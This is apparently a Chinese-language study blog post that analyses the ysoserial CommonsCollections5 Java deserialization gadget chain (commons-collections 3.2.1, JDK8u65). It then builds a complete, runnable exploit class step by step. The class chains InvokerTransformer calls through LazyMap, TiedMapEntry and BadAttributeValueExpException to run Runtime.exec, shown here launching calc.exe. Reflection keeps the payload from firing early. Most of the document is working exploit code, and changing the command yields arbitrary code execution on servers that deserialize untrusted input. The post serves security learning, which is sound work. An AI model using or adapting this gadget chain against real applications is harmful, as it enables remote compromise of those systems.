# 环境

- commons-collections:3.2.1
- JDK8u65

我看到ysoserial里面给的环境是commons-collections:3.1和jdk8u76。

jdk8u76在oracle官网没找到，并且看到有别的师傅用的还是8u65，就不改了。

# CC5

看一下ysoserial给的Gadget chain：

```java
/*
	Gadget chain:
        ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()
 */
```

BadAttributeValueExpException的readObject：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231214141831.png)

TiedMapEntry的toString()

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231214143344.png)

跟进getValue：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231214144721.png)

LazyMap的get：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231214144139.png)

后面就比较熟，跳过了。

接下来尝试写exp。首先，LazyMap后面是可以直接复制CC1的：

```java
Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
        new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
        new InvokerTransformer("exec", new Class[] { String.class}, new String[] { "calc.exe" }),
};
Transformer transformerChain = new ChainedTransformer(transformers);
Map innerMap = new HashMap();
Map outerMap = LazyMap.decorate(innerMap, transformerChain);
```

然后是调用LazyMap的get这一部分，也就是TiedMapEntry。由于该类实现了Serializable接口，所以直接实例化并控制map为LazyMap：

```java
TiedMapEntry tiedMapEntryClass = new TiedMapEntry(outerMap,1);
```

最后是入口类，需要令valObj为tiedMapEntryClass

```java
BadAttributeValueExpException badAttributeValueExpExceptionClass = new BadAttributeValueExpException(tiedMapEntryClass);
```

拼一下：

```java
Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class}, new String[] { "calc.exe" }),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry tiedMapEntryClass = new TiedMapEntry(outerMap,1);
        BadAttributeValueExpException badAttributeValueExpExceptionClass = new BadAttributeValueExpException(tiedMapEntryClass);
```

但是运行发现会有干扰，原因是BadAttributeValueExpException实例化时val不为null会直接调用TiedMapEntry的toString。![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231214153144.png)

用反射来避免这一点：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC5_8u65 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class}, new String[] { "calc.exe" }),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry tiedMapEntryClass = new TiedMapEntry(outerMap,1);
        BadAttributeValueExpException badAttributeValueExpExceptionClass = new BadAttributeValueExpException(null);
        Field badAttributeValueExpExceptionField = badAttributeValueExpExceptionClass.getClass().getDeclaredField("val");
        badAttributeValueExpExceptionField.setAccessible(true);
        badAttributeValueExpExceptionField.set(badAttributeValueExpExceptionClass,tiedMapEntryClass);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(badAttributeValueExpExceptionClass);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}

```

# 总结

比较简单。
